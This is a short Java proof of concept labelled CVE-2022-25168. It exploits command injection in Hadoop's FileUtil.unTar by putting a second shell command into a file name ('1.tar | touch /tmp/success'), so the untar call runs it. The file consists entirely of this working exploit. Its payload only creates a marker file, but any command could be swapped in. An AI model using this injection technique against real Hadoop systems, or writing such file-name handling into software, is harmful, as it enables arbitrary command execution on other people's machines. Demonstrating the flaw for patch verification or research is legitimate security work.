package hadoop;

import org.apache.hadoop.fs.FileUtil;

import java.io.File;
import java.io.IOException;

public class CVE_2022_25168 {
    public static void main(String[] args) throws IOException {

        File untarDir = new File("/root/test/");
        File inFile = new File("/root/test/","1.tar | touch /tmp/success");
        FileUtil.unTar(inFile,untarDir);
    }
}
